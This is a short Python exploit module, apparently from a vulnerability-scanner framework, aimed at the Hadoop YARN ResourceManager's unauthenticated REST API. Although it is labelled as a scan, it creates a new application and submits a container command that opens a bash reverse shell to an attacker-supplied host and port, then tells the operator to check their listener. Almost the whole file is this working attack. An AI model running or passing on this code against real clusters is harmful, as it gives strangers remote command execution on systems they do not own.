#!/user/bin/env python3
# -*- coding: utf-8 -*-
import requests
from pub.com.outprint import OutPrintInfo
from pub.com.reqset import ReqSet
import urllib3
urllib3.disable_warnings()
class Hadoop_Wsq_Scan:
    def main(self,target):
        baseurl = target['url'].strip("/ ")
        lhost = target["lhost"]  # put your local host ip here, and listen at port 9999
        lport = str(target["lport"])  # put your local host ip here, and listen at port 9999
        self.ssl = target["ssl"]
        self.header = target["header"]
        proxy = target["proxy"]
        _, self.proxy = ReqSet(proxy=proxy)
        OutPrintInfo("Hadoop", "开始检测Hadoop YARN ResourceManager 未授权访问...")
        url = baseurl + '/ws/v1/cluster/apps/new-application'

        resp = requests.post(url,verify=self.ssl,proxies=self.proxy,headers=self.header)
        app_id = resp.json()['application-id']
        url = baseurl + '/ws/v1/cluster/apps'
        data = {
            'application-id': app_id,
            'application-name': 'get-shell',
            'am-container-spec': {
                'commands': {
                    'command': f'/bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'
                },
            },
            'application-type': 'YARN',
        }
        requests.post(url, json=data,verify=self.ssl,proxies=self.proxy,headers=self.header)
        OutPrintInfo("Hadoop","脚本执行完成自行检测是否监听到目标")